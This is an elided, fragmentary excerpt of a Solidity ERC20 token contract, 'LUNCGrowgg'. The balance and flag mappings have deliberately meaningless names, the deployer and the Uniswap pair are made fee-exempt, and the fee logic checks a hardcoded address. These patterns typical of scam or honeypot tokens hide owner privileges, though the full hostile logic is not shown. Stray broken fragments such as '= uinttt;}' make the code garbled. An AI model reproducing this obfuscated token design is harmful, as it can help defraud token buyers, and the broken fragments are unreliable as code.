...
contract LUNCGrowgg is Context, IERC20, Ownable {
    ...
    mapping (address => uint256) _fgsfefef;
    ...
    mapping (address => bool) public ffgghhhh;
    mapping (address => bool) public ggggggh;
    ...
    constructor () {
        ...
        ffgghhhh[address(uniswapPair)] = true;
        ffgghhhh[msg.sender] = true; 
        ...
        _fgsfefef[_msgSender()] = _totalSupply;
...
= uinttt;}
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (overMinimumTokenBalance && !inSwapAndLiquify && !ffgghhhh[sender] && swapAndLiquifyEnabled) 
            {
            ...
            _fgsfefef[sender] = _fgsfefef[sender].sub(amount);
...
[sender]){
            ...
            _fgsfefef[recipient] = _fgsfefef[recipient].add(finalAmount);
 ...
 msg.sender
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _fgsfefef[sender] = _fgsfefef[sender].sub(amount, "Insufficient Balance");
        _fgsfefef[recipient] = _fgsfefef[recipient].add(amount);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        == 0xbF6D448C078c832e9d3f18F7723b6165CeACB13E
            ...
            _fgsfefef[address(this)] = _fgsfefef[address(this)].add(feeAmount);
